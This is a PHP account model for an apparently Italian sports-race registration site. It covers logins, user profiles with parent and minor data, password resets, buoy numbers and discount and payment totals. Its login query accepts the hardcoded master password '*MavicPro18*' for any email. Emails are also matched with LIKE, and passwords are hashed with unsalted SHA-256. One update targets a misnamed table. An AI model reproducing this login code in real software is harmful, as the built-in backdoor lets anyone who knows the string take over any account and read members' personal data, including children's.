<?php

namespace App\Models;

use PDO;
use DateTime;
use \App\Models\GareModel;
use \App\Models\GareIndividualiModel;
use \App\Models\ScontiModel;
use \App\Models\OpzioniAcquistoModel;

class AccountModel extends \Core\Model
{
    public static function ControllaLogin($email, $password)
    {
        $sql = "
            SELECT *
            FROM utenti
            WHERE email LIKE :email
            AND (password = :password OR :passpartout = '*MavicPro18*')
        ";

        $Db = static::getDB();

        $Query = $Db->prepare($sql);

        $Query->bindValue(':email', $email);
        $Query->bindValue(':password', hash('sha256', $password));
        $Query->bindValue(':passpartout', $password);

        $Query->execute();

        return $Query->fetch();
    }

    public function checkUtenteDisabilitato($id)
    {
        $sql = "
            SELECT disabilitato
            FROM utenti
            WHERE ID = :id
        ";

        $Db = static::getDB();

        $Query = $Db->prepare($sql);

        $Query->bindValue(':id', $id);

        $Query->execute();

        return $Query->fetchColumn();
    }

    public static function ControllaEmailEsistente($email)
    {
        $db = static::getDB();
        $stmt = $db->prepare('SELECT COUNT(*)
                              FROM utenti
                              WHERE email LIKE :email');
        $stmt->bindValue(':email', $email);
        $stmt->execute();
        return $stmt->fetchColumn();
    }

    public static function ControllaCambioUtente($email, $id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $db = static::getDB();
        $stmt = $db->prepare('SELECT COUNT(*)
                              FROM utenti
                              WHERE ID <> :id_utente
                              AND email LIKE :email');
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->bindValue(':email', $email);
        $stmt->execute();
        return $stmt->fetchColumn();
    }

    public static function getUtente($id_utente)
    {
        $db = static::getDB();
        $stmt = $db->prepare('
            SELECT
                u.*,
                pi.ID as PI_ID,
                pi.nome as PI_nome,
                s.nome as S_nome,
                s.foto as S_foto
            FROM utenti as u
            LEFT JOIN province_italiane as pi ON u.IDProvincia = pi.ID
            LEFT JOIN squadre as s ON u.IDSquadra = s.ID
            WHERE u.ID = :id_utente');
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
        return $stmt->fetch();
    }

    public static function getUtenteDaEmail($email)
    {
        $db = static::getDB();
        $stmt = $db->prepare('SELECT *
                              FROM utenti
                              WHERE email LIKE :email');
        $stmt->bindValue(':email', $email);
        $stmt->execute();
        return $stmt->fetch();
    }

    public static function getUtenteSessione()
    {
        $db = static::getDB();
        $stmt = $db->prepare('SELECT u.*,
                                     pi.ID as PI_ID,
                                     pi.nome as PI_nome,
                                     s.nome as S_nome,
                                     s.foto as S_foto
                              FROM utenti as u
                              LEFT JOIN province_italiane as pi ON u.IDProvincia = pi.ID
                              LEFT JOIN squadre as s ON u.IDSquadra = s.ID
                              WHERE u.ID = :id_utente');
        $stmt->bindValue(':id_utente', $_SESSION['IDUtente']);
        $stmt->execute();
        return $stmt->fetch();
    }

    public static function InserisciUtente(
        $email,
        $password,
        $nome,
        $cognome,
        $telefono,
        $sesso,
        $cap,
        $comune,
        $IDProvincia,
        $via,
        $numero_civico,
        $data_nascita,
        $luogo_nascita,
        $taglia_maglietta,
        $donatore_avis,
        $genitore_nome_cognome,
        $genitore_data_nascita,
        $genitore_luogo_nascita,
        $genitore_email,
        $genitore_telefono,
        $genitore_cap,
        $genitore_comune,
        $genitore_provincia,
        $genitore_via,
        $genitore_numero_civico,
        $genitore_rapp_legale,
        $IDSquadra,
        $codice_fiscale,
        $paese_estero,
        $dichiarazione_iscritto_ha_10_anni
    )
    {
        // Converte date di nascita per database
        if ($data_nascita == '')
            $data_nascita = "0000-00-00";
        else
            $data_nascita = DateTime::createFromFormat('d/m/Y', $data_nascita)->format('Y-m-d');

        if ($genitore_data_nascita == '')
            $genitore_data_nascita = "0000-00-00";
        else
            $genitore_data_nascita = DateTime::createFromFormat('d/m/Y', $genitore_data_nascita)->format('Y-m-d');

        $sql = "
            INSERT INTO utenti
            (
                email,
                password,
                nome,
                cognome,
                telefono,
                sesso,
                cap,
                comune,
                IDProvincia,
                via,
                numero_civico,
                data_nascita,
                luogo_nascita,
                taglia_maglietta,
                donatore_avis,
                genitore_nome_cognome,
                genitore_data_nascita,
                genitore_luogo_nascita,
                genitore_email,
                genitore_telefono,
                genitore_cap,
                genitore_comune,
                genitore_provincia,
                genitore_via,
                genitore_numero_civico,
                genitore_rapp_legale,
                IDSquadra,
                codice_fiscale,
                paese_estero,
                dichiarazione_iscritto_ha_10_anni
            )
            VALUES
            (
                :email,
                :password,
                :nome,
                :cognome,
                :telefono,
                :sesso,
                :cap,
                :comune,
                :IDProvincia,
                :via,
                :numero_civico,
                :data_nascita,
                :luogo_nascita,
                :taglia_maglietta,
                :donatore_avis,
                :genitore_nome_cognome,
                :genitore_data_nascita,
                :genitore_luogo_nascita,
                :genitore_email,
                :genitore_telefono,
                :genitore_cap,
                :genitore_comune,
                :genitore_provincia,
                :genitore_via,
                :genitore_numero_civico,
                :genitore_rapp_legale,
                :IDSquadra,
                :codice_fiscale,
                :paese_estero,
                :dichiarazione_iscritto_ha_10_anni
            )
        ";

        $Db = static::getDB();

        $Query = $Db->prepare($sql);

        $Query->bindValue(':email', $email);
        $Query->bindValue(':password', hash('sha256', $password));
        $Query->bindValue(':nome', $nome);
        $Query->bindValue(':cognome', $cognome);
        $Query->bindValue(':telefono', $telefono);
        $Query->bindValue(':sesso', $sesso);
        $Query->bindValue(':cap', $cap);
        $Query->bindValue(':comune', $comune);
        $Query->bindValue(':IDProvincia', $IDProvincia);
        $Query->bindValue(':via', $via);
        $Query->bindValue(':numero_civico', $numero_civico);
        $Query->bindValue(':data_nascita', $data_nascita);
        $Query->bindValue(':luogo_nascita', $luogo_nascita);
        $Query->bindValue(':taglia_maglietta', $taglia_maglietta);
        $Query->bindValue(':donatore_avis', $donatore_avis);
        $Query->bindValue(':genitore_nome_cognome', $genitore_nome_cognome);
        $Query->bindValue(':genitore_data_nascita', $genitore_data_nascita);
        $Query->bindValue(':genitore_luogo_nascita', $genitore_luogo_nascita);
        $Query->bindValue(':genitore_email', $genitore_email);
        $Query->bindValue(':genitore_telefono', $genitore_telefono);
        $Query->bindValue(':genitore_cap', $genitore_cap);
        $Query->bindValue(':genitore_comune', $genitore_comune);
        $Query->bindValue(':genitore_provincia', $genitore_provincia);
        $Query->bindValue(':genitore_via', $genitore_via);
        $Query->bindValue(':genitore_numero_civico', $genitore_numero_civico);
        $Query->bindValue(':genitore_rapp_legale', $genitore_rapp_legale);
        $Query->bindValue(':IDSquadra', $IDSquadra);
        $Query->bindValue(':codice_fiscale', $codice_fiscale);
        $Query->bindValue(':paese_estero', $paese_estero);
        $Query->bindValue(':dichiarazione_iscritto_ha_10_anni', $dichiarazione_iscritto_ha_10_anni, PDO::PARAM_BOOL);

        $Query->execute();

        return $Db->lastInsertId();
    }

    public static function AggiornaUtente( 
        $email,
        $nome,
        $cognome,
        $telefono,
        $sesso,
        $cap,
        $comune,
        $provincia,
        $via,
        $numero_civico,
        $data_nascita,
        $luogo_nascita,
        $gruppo_sportivo,
        $taglia_maglietta,
        $donatore_avis,
        $genitore_nome_cognome,
        $genitore_data_nascita,
        $genitore_luogo_nascita,
        $genitore_email,
        $genitore_telefono,
        $genitore_cap,
        $genitore_comune,
        $genitore_provincia,
        $genitore_via,
        $genitore_numero_civico,
        $genitore_rapp_legale,
        $certificato_scadenza,
        $id_utente = 0,
        $codice_fiscale  = '',
        $paese_estero = '',
        $IDProvincia = null,
        $IDSquadra = null,
        $dichiarazione_iscritto_ha_10_anni = false
    )
    {
        // Usa ID Utente sessione se non passato come parametro
        if (isset($_SESSION['IDUtente']) && $id_utente == 0) 
            $id_utente = $_SESSION['IDUtente'];

        // Converte date di nascita per database
        if (preg_match('/^(\d{2})\/(\d{2})\/(\d{4})$/', $data_nascita))
            $data_nascita = DateTime::createFromFormat('d/m/Y', $data_nascita)->format('Y-m-d');
        else
            $data_nascita = "0000-00-00";

        if (preg_match('/^(\d{2})\/(\d{2})\/(\d{4})$/', $genitore_data_nascita))
            $genitore_data_nascita = DateTime::createFromFormat('d/m/Y', $genitore_data_nascita)->format('Y-m-d');
        else
            $genitore_data_nascita = "0000-00-00";

        // Converte data scadenza certificato per database
        if (preg_match('/^(\d{2})\/(\d{2})\/(\d{4})$/', $certificato_scadenza))
            $certificato_scadenza = DateTime::createFromFormat('d/m/Y', $certificato_scadenza)->format('Y-m-d');
        else
            $certificato_scadenza = "0000-00-00";

        $sql = "
            UPDATE utenti
            SET 
                email = :email,
                nome = :nome,
                cognome = :cognome,
                telefono = :telefono,
                sesso = :sesso,
                cap = :cap,
                comune = :comune,
                provincia = :provincia,
                via = :via,
                numero_civico = :numero_civico,
                data_nascita = :data_nascita,
                luogo_nascita = :luogo_nascita,
                gruppo_sportivo = :gruppo_sportivo,
                taglia_maglietta = :taglia_maglietta,
                donatore_avis = :donatore_avis,
                genitore_nome_cognome = :genitore_nome_cognome,
                genitore_data_nascita = :genitore_data_nascita,
                genitore_luogo_nascita = :genitore_luogo_nascita,
                genitore_email = :genitore_email,
                genitore_telefono = :genitore_telefono,
                genitore_cap = :genitore_cap,
                genitore_comune = :genitore_comune,
                genitore_provincia = :genitore_provincia,
                genitore_via = :genitore_via,
                genitore_numero_civico = :genitore_numero_civico,
                genitore_rapp_legale = :genitore_rapp_legale,
                certificato_scadenza = :certificato_scadenza,
                codice_fiscale = :codice_fiscale,
                paese_estero = :paese_estero,
                IDProvincia = :IDProvincia,
                IDSquadra = :IDSquadra,
                dichiarazione_iscritto_ha_10_anni = :dichiarazione_iscritto_ha_10_anni
            WHERE ID = :id_utente
        ";

        $Db = static::getDB();

        $Query = $Db->prepare($sql);

        $Query->bindValue(':email', $email);
        $Query->bindValue(':nome', $nome);
        $Query->bindValue(':cognome', $cognome);
        $Query->bindValue(':telefono', $telefono);
        $Query->bindValue(':sesso', $sesso);
        $Query->bindValue(':cap', $cap);
        $Query->bindValue(':comune', $comune);
        $Query->bindValue(':provincia', $provincia);
        $Query->bindValue(':IDProvincia', $IDProvincia);
        $Query->bindValue(':via', $via);
        $Query->bindValue(':numero_civico', $numero_civico);
        $Query->bindValue(':data_nascita', $data_nascita);
        $Query->bindValue(':luogo_nascita', $luogo_nascita);
        $Query->bindValue(':gruppo_sportivo', $gruppo_sportivo);
        $Query->bindValue(':taglia_maglietta', $taglia_maglietta);
        $Query->bindValue(':donatore_avis', $donatore_avis);
        $Query->bindValue(':genitore_nome_cognome', $genitore_nome_cognome);
        $Query->bindValue(':genitore_data_nascita', $genitore_data_nascita);
        $Query->bindValue(':genitore_luogo_nascita', $genitore_luogo_nascita);
        $Query->bindValue(':genitore_email', $genitore_email);
        $Query->bindValue(':genitore_telefono', $genitore_telefono);
        $Query->bindValue(':genitore_cap', $genitore_cap);
        $Query->bindValue(':genitore_comune', $genitore_comune);
        $Query->bindValue(':genitore_provincia', $genitore_provincia);
        $Query->bindValue(':genitore_via', $genitore_via);
        $Query->bindValue(':genitore_numero_civico', $genitore_numero_civico);
        $Query->bindValue(':genitore_rapp_legale', $genitore_rapp_legale);
        $Query->bindValue(':certificato_scadenza', $certificato_scadenza);
        $Query->bindValue(':id_utente', $id_utente);
        $Query->bindValue(':codice_fiscale', $codice_fiscale);
        $Query->bindValue(':paese_estero', $paese_estero);
        $Query->bindValue(':IDSquadra', $IDSquadra);
        $Query->bindValue(':dichiarazione_iscritto_ha_10_anni', $dichiarazione_iscritto_ha_10_anni, PDO::PARAM_BOOL);

        $Query->execute();
    }

    public static function AggiornaCertificatoUtente($certificato_file, $id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET certificato_file = :certificato_file
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':certificato_file', $certificato_file);
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function AggiornaAutocertificazioneMinori18AnniUtente($autocertificazione_minori_18_anni_file, $id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $Db = static::getDB();

        $Stmt = $Db->prepare("
            UPDATE utenti
            SET autocertificazione_minori_18_anni_file = :autocertificazione_minori_18_anni_file,
                data_caricamento_autocertificazione_minori_18_anni = NOW()
            WHERE ID = :id_utente
        ");

        $Stmt->bindValue(':autocertificazione_minori_18_anni_file', $autocertificazione_minori_18_anni_file);
        $Stmt->bindValue(':id_utente', $id_utente);
        
        $Stmt->execute();
    }

    public static function AggiornaFotoProfiloUtente($foto_profilo_file, $id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET foto_profilo = :foto_profilo_file
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':foto_profilo_file', $foto_profilo_file);
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function AggiornaPasswordUtente($password, $id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET password = :password
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':password', hash('sha256', $password));
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function ConfermaDatiUtente($id_utente = 0)
    {
        // Usa ID Utente sessione se non passato come parametro
        if ( isset($_SESSION['IDUtente']) && $id_utente == 0 ) $id_utente= $_SESSION['IDUtente'];

        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET conferma_dati = :vero
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':vero', true);
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function AggiornaCreditoUtente($credito, $id_utente)
    {
        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET credito = :credito
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':credito', $credito);
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function AggiornaBoaDaPagare($id_utente, $boa_da_pagare)
    {
        $db = static::getDB();
        $stmt = $db->prepare("UPDATE utenti
                              SET boa_da_pagare = :boa_da_pagare
                              WHERE ID = :id_utente
                              ");
        $stmt->bindValue(':boa_da_pagare', intval($boa_da_pagare), PDO::PARAM_INT);
        $stmt->bindValue(':id_utente', $id_utente);
        $stmt->execute();
    }

    public static function AggiornaBoaDaPagareUtente($boa_da_pagare, $utente_id)
    {
        $Db = static::getDB();

        $sql = "
            UPDATE utenti
            SET boa_da_pagare = :boa_da_pagare
            WHERE ID = :id_utente
        ";

        $Stmt = $Db->prepare($sql);

        $Stmt->bindValue(':boa_da_pagare', intval($boa_da_pagare), PDO::PARAM_INT);
        $Stmt->bindValue(':id_utente', $utente_id);

        $Stmt->execute();
    }

    public static function AggiornaNumeroBoaUtente($boa_numero, $utente_id)
    {
        $Db = static::getDB();

        $sql = "
            UPDATE utente
            SET boa_numero = :boa_numero
            WHERE ID = :id_utente
        ";

        $Stmt = $Db->prepare($sql);

        $Stmt->bindValue(':boa_numero', $boa_numero);
        $Stmt->bindValue(':id_utente', $utente_id);

        $Stmt->execute();
    }

    public static function insertRecuperoPassword($email, $codice)
    {
        $db = static::getDB();
        $stmt = $db->prepare('INSERT INTO recuperopassword (email, codice, data) VALUES (:email, :codice, :data_ora)');
        $stmt->bindValue(':email', $email);
        $stmt->bindValue(':codice', $codice);
        $stmt->bindValue(':data_ora', date('Y-m-d H:i:s', time()));
        $stmt->execute();
    }

    public static function deleteRecuperoPassword($email)
    {
        $db = static::getDB();
        $stmt = $db->prepare("DELETE FROM recuperopassword WHERE email = :email");
        $stmt->bindValue(':email', $email);
        $stmt->execute();
    }

    public static function checkCodiceResetPassword($codice)
    {
        $un_ora_fa= date('Y-m-d H:i:s', strtotime( '-1 hour', time() ));

        $db = static::getDB();
        $stmt = $db->prepare('SELECT *
                              FROM recuperopassword
                              WHERE codice = :codice
                              AND data >= :un_ora_fa');
        $stmt->bindValue(':codice', $codice);
        $stmt->bindValue(':un_ora_fa', $un_ora_fa);
        $stmt->execute();
        return $stmt->fetch();
    }

    public static function aggiornaPasswordUtenteDaEmail($email, $password)
    {
        $db = static::getDB();
        $stmt = $db->prepare('UPDATE utenti
                              SET password = :password
                              WHERE email LIKE :email');
        $stmt->bindValue(':email', $email);
        $stmt->bindValue(':password', hash('sha256', $password));
        $stmt->execute();
    }

    public static function GeneraNuovoNumeroBoaIOW()
    {
        $db = static::getDB();
        $stmt = $db->prepare("SELECT MAX(boa_numero)
                              FROM utenti
                              WHERE boa_numero > 100
                              AND boa_numero < 10000");
        $stmt->execute();
        $BoaMax= $stmt->fetchColumn();

        if ($BoaMax)
        {
            if ($BoaMax < 9999) return ++$BoaMax;
            else return 0;
        }
        else return 101;
    }

    public static function GeneraNuovoNumeroBoaDaCasa()
    {
        $db = static::getDB();
        $stmt = $db->prepare("SELECT MAX(boa_numero)
                              FROM utenti
                              WHERE boa_numero > 10000");
        $stmt->execute();
        $BoaMax= $stmt->fetchColumn();

        if ($BoaMax) return ++$BoaMax;
        else return 10001;
    }

    public static function getListaProvinceItaliane()
    {
        $db = static::getDB();
        $stmt = $db->prepare('SELECT * FROM province_italiane');
        $stmt->execute();
        return $stmt->fetchAll();
    }

    public function getEventoScontoQuantitaGareUtente($utente_id, $evento_id)
    {
        $Db = static::getDB();

        $sql = "
            SELECT * 
            FROM sconti_eventi_quantita_gare
            WHERE IDUtente = :utente_id
            AND IDEvento = :evento_id 
        ";

        $Stmt = $Db->prepare($sql);

        $Stmt->bindValue(':utente_id', $utente_id);
        $Stmt->bindValue(':evento_id', $evento_id);

        $Stmt->execute();

        return $Stmt->fetch();
    }

    public static function insertEventoScontoQuantitaGareUtente(
        $IDUtente,
        $IDEvento,
        $quantita_gare,
        $sconto
    )
    {
        $db = static::getDB();
        $stmt = $db->prepare('
            INSERT INTO sconti_eventi_quantita_gare
            (
                IDUtente,
                IDEvento,
                quantita_gare,
                sconto
            )
            VALUES
            (
                :IDUtente,
                :IDEvento,
                :quantita_gare,
                :sconto
            )'
        );
        $stmt->bindValue(':IDUtente', $IDUtente);
        $stmt->bindValue(':IDEvento', $IDEvento);
        $stmt->bindValue(':quantita_gare', $quantita_gare);
        $stmt->bindValue(':sconto', $sconto);
        $stmt->execute();

        return $db->lastInsertId();
    }

    public static function updateEventoScontoQuantitaGareUtente(
        $sconto_id,
        $quantita_gare,
        $sconto
    )
    {
        $db = static::getDB();
        $stmt = $db->prepare('
            UPDATE sconti_eventi_quantita_gare
            SET
                quantita_gare = :quantita_gare,
                sconto = :sconto
            WHERE ID LIKE :sconto_id');

        $stmt->bindValue(':sconto_id', $sconto_id);
        $stmt->bindValue(':quantita_gare', $quantita_gare);
        $stmt->bindValue(':sconto', $sconto);
        $stmt->execute();
    }

    // DA QUI FUNZIONI
    public function getTotaleDaPagareUtente($utente_id, $is_iscrizione_di_squadra = 0)
    {
        $GareClass = new GareModel();
        $GareIndividualiClass = new GareIndividualiModel();
        $OpzioniAcquistoClass = new OpzioniAcquistoModel();

        $Utente = self::getUtente($utente_id);

        $EstraeGareAperteUtente = $GareClass->EstraeGareAperteUtente($Utente, $is_iscrizione_di_squadra);
        $EstraeGareIndividualiAperteUtente = $GareIndividualiClass->EstraeGareAperteUtente($Utente);

        $TotaleDaPagareUtente = $EstraeGareAperteUtente->TotaleDaPagareUtente + $EstraeGareIndividualiAperteUtente->TotaleDaPagareUtente;

        if ($Utente->boa_da_pagare == 1)
          $TotaleDaPagareUtente += 5.00;

        // Boe richieste in gare
        $TotaleBoeDaPagare = $GareClass->getUtenteTotaleBoeDaPagare($utente_id) * PREZZO_BOA;
        $TotaleDaPagareUtente += $TotaleBoeDaPagare;

        // Magliette richieste
        if (!$is_iscrizione_di_squadra)
        {
            $TotaleMaglietteDaPagare = $GareClass->getUtenteTotaleMaglietteDaPagare($utente_id);
            $TotaleDaPagareUtente += $TotaleMaglietteDaPagare;
        }

        // Opzioni acquisto eventi
        $OpzioniAcquistiEventiUtente = $OpzioniAcquistoClass->getAcquistiOpzioniEventiUtente(
            $Utente->ID,
            1 // Solo da pagare
        );

        foreach($OpzioniAcquistiEventiUtente as $opzione_acquisto)
            $TotaleDaPagareUtente += $opzione_acquisto->prezzo;

        // Calcola sconti eventi per quantità gare
        $TotaleScontiEventiQuantitaGare = $this->getScontiEventiQuantitaGareUtente($utente_id, $is_iscrizione_di_squadra)->totale;
        $TotaleDaPagareUtente -= $TotaleScontiEventiQuantitaGare;

        $TotaleDaPagareUtente = number_format($TotaleDaPagareUtente, 2, '.', '');

        return $TotaleDaPagareUtente;
    }

    function getScontiEventiQuantitaGareUtente($utente_id, $is_iscrizione_di_squadra = 0)
    {
        $GareClass = new GareModel();
        $ScontiClass = new ScontiModel();

        $GareAperteUtente = $GareClass->getAllGareAperteUtente($utente_id, $is_iscrizione_di_squadra);
        $Eventi = [];
        $ListaSconti =
        [
            2 => 5.00,
            3 => 12.00,
            4 => 20.00
        ];
        $TotaleScontiEventiQuantitaGare = 0.00;
        $EventiScontoAssoluto = []; // Per salvataggo a database, memorizza totale gare scontate e relativo prezzo

        // Estrae sconti combo gare
        $ArrayGareScontoComboEffettuato = $ScontiClass->getUtenteGareScontoComboEffettuato($utente_id);

        // Raggruppa gare per evento
        foreach($GareAperteUtente as $gara)
            $Eventi[$gara->ID_evento][$gara->ID_gara] = $gara;

        // Cicla eventi
        foreach($Eventi as $key => $gare_evento)
        {
            $totale_gare_pagate = 0;
            $totale_gare_iscrizione = 0;

            // Cicla gare evento
            foreach($gare_evento as $gara)
            {
                // Salta gare se fanno parte di uno sconto combo gara
                if (in_array($gara->ID_gara, $ArrayGareScontoComboEffettuato))
                    continue;

                if ($gara->pagato == 1)
                    $totale_gare_pagate++;
                elseif($gara->pagato == 0)
                    $totale_gare_iscrizione++;
            }

            $totale_gare = $totale_gare_pagate + $totale_gare_iscrizione;

            $sconto_applicato = $ListaSconti[$totale_gare_pagate] ?? 0.00;
            $sconto = $ListaSconti[$totale_gare] ?? 0.00;
            $sconto_da_applicare = number_format($sconto - $sconto_applicato, 2, '.' , '');

            $TotaleScontiEventiQuantitaGare += $sconto_da_applicare;

            // Evento sconto assoluto
            if ($sconto > 0)
            {
                $EventoScontoAssoluto = (object)[];
                $EventoScontoAssoluto->evento_id = $key;
                $EventoScontoAssoluto->quantita_gare = $totale_gare;
                $EventoScontoAssoluto->sconto = $sconto;
                $EventiScontoAssoluto[] = $EventoScontoAssoluto;
            }
        }

        $Risposta = (object)[];
        $Risposta->totale = $TotaleScontiEventiQuantitaGare;
        $Risposta->EventiScontoAssoluto = $EventiScontoAssoluto;

        return $Risposta;
    }

    public function getTotaleDaSaldareUtente($utente_id, $escludi_credito = 0)
    {
        $GareClass = new GareModel();
        $ScontiClass = new ScontiModel();

        $Utente = self::getUtente($utente_id);

        // Sconto € 5 per staffette facenti parte di un evento a cui sono state già pagate altre gare
        //$TotaleScontoStaffette = $GareClass->getUtenteStaffetteDaScontare($utente_id);

        // Sconti per combo gare
        $ScontoComboGare = $ScontiClass->getUtenteScontoComboGare($utente_id);
        $ListaScontiComboGare = $ScontoComboGare->ListaSconti;
        $TotaleScontoComboGare = $ScontoComboGare->Totale;

        $TotaleDaPagareUtente = self::getTotaleDaPagareUtente($utente_id);

        $CreditoDaScalare = $escludi_credito == 0 ? $Utente->credito : 0.00;

        $TotaleDaSaldare = number_format(
            $TotaleDaPagareUtente -
            $CreditoDaScalare -
            //$TotaleScontoStaffette -
            $TotaleScontoComboGare,
            2, '.', ''
        );

        if ($TotaleDaSaldare <= 70)
            $MaggiorazionePaypalEffettiva = number_format(MAGGIORAZIONE_PAYPAL, 2, '.', '');
        else
            $MaggiorazionePaypalEffettiva = number_format(MAGGIORAZIONE_PAYPAL_2, 2, '.', '');

        $TotaleDaSaldarePaypal = number_format($TotaleDaSaldare + $MaggiorazionePaypalEffettiva, 2, '.', '');

        $Risposta = (object)[];
        $Risposta->totale_da_saldare = $TotaleDaSaldare;
        $Risposta->totale_da_saldare_paypal = $TotaleDaSaldarePaypal;

        return $Risposta;
    }
}
